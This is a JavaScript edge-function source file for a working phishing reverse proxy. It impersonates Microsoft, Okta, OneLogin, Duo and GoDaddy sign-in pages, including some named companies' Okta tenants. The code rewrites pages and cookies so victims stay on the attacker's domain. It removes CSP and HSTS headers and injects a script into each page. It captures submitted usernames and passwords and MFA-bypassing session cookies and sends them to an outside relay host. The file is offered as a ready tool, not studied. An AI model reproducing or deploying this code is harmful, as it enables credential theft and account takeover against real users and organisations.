export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'esctx', 'CCState', 'buid', 'fpc'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

const POST_LOGIN_PATTERNS = {
  microsoft: ['/common/oauth2/authorize', '/common/oauth2/v2.0/authorize', '/common/login', '/common/SAS/ProcessAuth', '/kmsi'],
  okta: ['/oauth2/v1/authorize', '/api/v1/authn'],
  onelogin: ['/access/idp', '/session'],
  duo: ['/frame/prompt'],
  godaddy: ['/authenticate', '/login/authenticate']
};

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    const provider = IDENTITY_PROVIDERS[upstreamDomain];
    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }
  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    isProxied: false
  };
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    if (shouldProxyDomain(url.hostname)) {
      return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + url.hostname + url.pathname + url.search;
    }
    return location;
  } catch (e) {
    return location;
  }
}

function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => p === '.*' ? true : cookieString.toLowerCase().includes(p.toLowerCase()));
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    const jsonData = JSON.parse(bodyText);
    user = jsonData.username || jsonData.email || jsonData.user || jsonData.login;
    pass = jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass;
    if (user && pass) return { user, pass };
  } catch (e) {}
  
  const pairs = bodyText.split('&');
  for (const pair of pairs) {
    const [key, value] = pair.split('=');
    if (!value) continue;
    const decoded = decodeURIComponent(value.replace(/\+/g, ' '));
    if (['login', 'loginfmt', 'username', 'email', 'user'].includes(key)) user = decoded;
    if (['passwd', 'password', 'pwd', 'pass'].includes(key)) pass = decoded;
  }
  return { user, pass };
}

// Minimal interceptor - only handles dynamic URLs
function generateInterceptorScript(upstreamDomain, currentPath) {
  const basePath = currentPath.replace(/\/[^\/]*$/, '/');
  return `<script>(function(){
    const P='${PROXY_PREFIX}',D='${YOUR_DOMAIN}',U='${upstreamDomain}',B='${basePath}';
    function r(u){if(!u)return u;if(u.includes(D+P))return u;if(u.startsWith('http')){try{let h=new URL(u).hostname;if(['login.microsoftonline.com','login.live.com','office.com','microsoft.com','msauth.net','okta.com','godaddy.com','secureserver.net'].some(d=>h.includes(d)))return u.replace(/^https?:\\/\\/[^\\/]+/,'https://'+D+P+h)}catch(e){}}if(u.startsWith('//')){let h=u.split('/')[2];if(h&&r('https://'+h)!==u)return'https://'+D+P+h+u.slice(2+h.length)}if(u.startsWith('/'))return u.startsWith(P)?u:'https://'+D+P+U+u;return'https://'+D+P+U+B+u}
    const f=window.fetch;window.fetch=function(u,o){try{return f.call(this,typeof u==='string'?r(u):u instanceof Request?new Request(r(u.url),u):u,o)}catch(e){return f.call(this,u,o)}};
    const x=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u,a,user,pwd){try{return x.call(this,m,r(u),a,user,pwd)}catch(e){return x.call(this,m,u,a,user,pwd)}};
    const s=HTMLFormElement.prototype.submit;HTMLFormElement.prototype.submit=function(){if(this.action)this.action=r(this.action);return s.call(this)};
    document.addEventListener('click',function(e){let f=e.target.closest('form');if(f&&f.action)f.action=r(f.action)},true);
  })();</script>`;
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  const upstreamPath = info.path + url.search;
  const upstreamUrl = 'https://' + upstreamDomain + upstreamPath;
  
  console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  // Build headers - PRESERVE client headers exactly
  const headers = new Headers();
  const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin', 'x-requested-with'];
  
  clientHeaders.forEach(h => {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  });

  // Set upstream-specific headers
  headers.set('Host', upstreamDomain);
  
  // Preserve original referer/origin if they exist and are valid
  const originalReferer = request.headers.get('referer');
  const originalOrigin = request.headers.get('origin');
  
  if (!originalReferer) {
    headers.set('Referer', 'https://' + upstreamDomain + '/');
  }
  if (!originalOrigin) {
    headers.set('Origin', 'https://' + upstreamDomain);
  }

  // Remove hop-by-hop headers
  ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
   'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for'].forEach(h => headers.delete(h));

  let bodyText = null;
  let requestBody = null;

  // Handle POST body for credential capture
  if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
    try {
      const cloned = request.clone();
      bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] ${user.substring(0,5)}... on ${info.type}`);
        await sendToVercel('credentials', { type: 'creds', ip, user, pass, platform: info.type, url: url.href });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        formData.append('ip', ip);
        formData.append('type', 'credentials');
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const resp = await fetch(upstreamUrl, {
      method: request.method,
      headers,
      body: requestBody,
      redirect: 'manual'
    });

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const newHeaders = new Headers(resp.headers);
        newHeaders.set('Location', rewriteLocation(loc));
        return new Response(null, { status: resp.status, headers: newHeaders });
      }
    }

    const newHeaders = new Headers(resp.headers);
    
    // CORS headers
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    
    // Security headers cleanup
    ['content-security-policy', 'content-security-policy-report-only', 'clear-site-data', 'strict-transport-security'].forEach(h => newHeaders.delete(h));

    // ==================== CRITICAL FIX: Cookie Handling ====================
    // Use the WORKING approach: simple domain string replacement, preserve everything else
    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
    let cookieStr = '';
    let shouldCapture = false;

    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      
      // Check for auth cookies (for exfiltration purposes only)
      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
      const isPostLogin = request.method === 'POST' && info.path.includes('/SAS/ProcessAuth');
      shouldCapture = isPostLogin || (resp.status === 302 && hasAuth);

      cookies.forEach(cookie => {
        if (!cookie) return;
        
        // CRITICAL FIX: Simple domain replacement only - exactly like working snippet
        // Replace upstream domain with YOUR_DOMAIN, preserve path and all other attributes
        let modifiedCookie = cookie.replace(new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'), YOUR_DOMAIN);
        
        // Also replace any other Microsoft domains that might appear in cookie
        Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
          modifiedCookie = modifiedCookie.replace(new RegExp(domain.replace(/\./g, '\\.'), 'g'), YOUR_DOMAIN);
        });
        
        // Ensure Secure and SameSite=None for cross-domain proxying
        if (!modifiedCookie.includes('Secure')) modifiedCookie += '; Secure';
        if (!modifiedCookie.includes('SameSite')) modifiedCookie += '; SameSite=None';
        
        newHeaders.append('Set-Cookie', modifiedCookie);
      });
    }

    if (shouldCapture && cookieStr) {
      await exfiltrateCookies(cookieStr, ip, info.type, url.href);
    }

    // Process response body
    const ct = resp.headers.get('content-type') || '';
    
    if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
      let text = await resp.text();
      
      // Insert interceptor for HTML
      if (ct.includes('text/html')) {
        const script = generateInterceptorScript(upstreamDomain, info.path);
        text = text.replace('<head>', '<head>' + script)
                   .replace('<html>', '<html>' + script);
        if (!text.includes(script)) text = script + text;
      }

      // Domain replacements in body - use global replace for all provider domains
      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
        const escaped = domain.replace(/\./g, '\\.');
        const regex = new RegExp('(https?:\\/\\/)' + escaped + '([^"\'`\\s)]*)', 'gi');
        text = text.replace(regex, 'https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$2');
      });

      // Handle relative paths in HTML
      if (ct.includes('text/html')) {
        const currentDir = info.path.replace(/\/[^\/]*$/, '/');
        
        // src/href absolute paths
        text = text.replace(/(src|href)="\/([^"]*)"/gi, (m, attr, path) => {
          if (path.startsWith('_p/') || path.startsWith('data:')) return m;
          return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
        });
        
        // Form actions - preserve order: protocol -> absolute -> relative
        text = text.replace(/action="(https?:\/\/[^"]+)"/gi, (m, url) => {
          try {
            const u = new URL(url);
            if (shouldProxyDomain(u.hostname)) {
              return `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${u.hostname}${u.pathname}${u.search}"`;
            }
          } catch(e) {}
          return m;
        });
        
        text = text.replace(/action="\/([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
        text = text.replace(/action="(?!\/|https?:|#|data:)([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${currentDir}$1"`);
        
        // CSS url()
        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, (m, path) => {
          if (path.startsWith('_p/')) return m;
          return `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path})`;
        });
      }

      return new Response(text, { status: resp.status, headers: newHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: newHeaders });

  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(JSON.stringify({ error: 'Proxy Error', message: err.message }), 
                       { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
